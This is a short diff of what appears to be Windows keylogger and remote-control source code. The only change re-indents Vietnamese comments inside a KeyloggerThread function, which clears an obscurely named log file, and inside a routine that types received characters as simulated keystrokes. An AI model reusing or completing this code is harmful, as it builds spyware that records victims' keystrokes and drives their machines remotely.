@@ -148,10 +148,10 @@ connect:
 DWORD WINAPI KeyloggerThread(LPVOID lpParameter)
 {
 	/**
- * Mở tệp nhật ký và xóa tất cả dữ liệu bên trong (nếu có).
- * Do đó, mỗi khi keylogger bắt đầu, nó sẽ không chứa các phím được nhấn
- * từ phiên trước.
- */
+	 * Mở tệp nhật ký và xóa tất cả dữ liệu bên trong (nếu có).
+	 * Do đó, mỗi khi keylogger bắt đầu, nó sẽ không chứa các phím được nhấn
+	 * từ phiên trước.
+	 */
 
 	remove("AdyW389234lWQ.txt");
 	std::ofstream loggerFile;
@@ -255,8 +255,8 @@ int SimulateKbtEventType(char *data)
 	SHORT vKeyCode;
 	Event event;
 	/**
- * Nhận từng ký tự và thực hiện thao tác gõ phím từng ký tự một
- * */
+	 * Nhận từng ký tự và thực hiện thao tác gõ phím từng ký tự một
+	 * */
 
 	while (*p)
 	{
